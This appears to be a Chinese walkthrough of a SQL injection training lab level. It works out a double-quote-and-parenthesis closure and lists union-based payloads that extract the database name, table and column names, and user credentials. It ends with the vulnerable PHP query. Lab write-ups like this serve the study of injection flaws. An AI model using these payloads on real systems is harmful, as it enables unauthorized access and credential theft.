# 确认闭合类型
当我们按照第一题的步骤进行时，会发现我们无法进行order by  
而且?id=1'也没有任何报错，这时候就要思考换一种闭合方式，也就是双引号  
当我们输入?id=1"时，报错了  
    near '"1"") LIMIT 0,1' at line 1  
    "1"") LIMIT 0,1  
可以发现，跟第一题相比，单引号变成了双引号，而且也是有括号闭合  
那么接下来思路就一样了  
# 确认回显位置
?id=-1") union select 1,2,3--+

# 查询数据库名
?id=-1") union select 1,database(),3 --+

# 查询表名
?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

# 查询列名
?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema=database()--+

# 查询值
?id=-1") union select 1,group_concat(username),group_concat(password) from users--+

# 源码
$id = '"' . $id . '"';  
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";  
对输入进行了双引号闭合